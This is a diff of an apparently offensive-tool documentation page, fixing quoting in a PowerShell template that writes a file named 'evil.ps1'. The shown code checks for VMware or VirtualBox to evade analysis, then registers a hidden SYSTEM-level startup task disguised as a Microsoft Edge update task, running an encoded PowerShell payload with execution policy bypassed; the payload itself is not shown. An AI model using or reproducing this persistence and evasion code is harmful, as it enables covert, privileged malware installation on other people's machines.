@@ -124,7 +124,7 @@ $c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline
 $template = '
 $VM=get-wmiobject win32_computersystem |select -ExpandProperty Model
 if(($VM -NotLike "*VMware*") -and ($VM -NotLike "VirtualBox")){
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument " -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded  "'+ $c + ' 
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument " -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded  '+ $c + '" 
 $trigger = New-ScheduledTaskTrigger -AtStartup 
 $settings = New-ScheduledTaskSettingsSet -Hidden
 $user = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest  
@@ -132,7 +132,7 @@ Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" -TaskPath "
 Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" 
 }
 '
-New-Item -Path . -Name evil.ps1 -Value $template </code></pre>
+New-Item -Path . -Name evil.ps1 -Value $template -Force</code></pre>
 <h2 id="operating-systems-tested">💻 Operating Systems Tested</h2>
 <ul>
 <li>Windows 7</li>
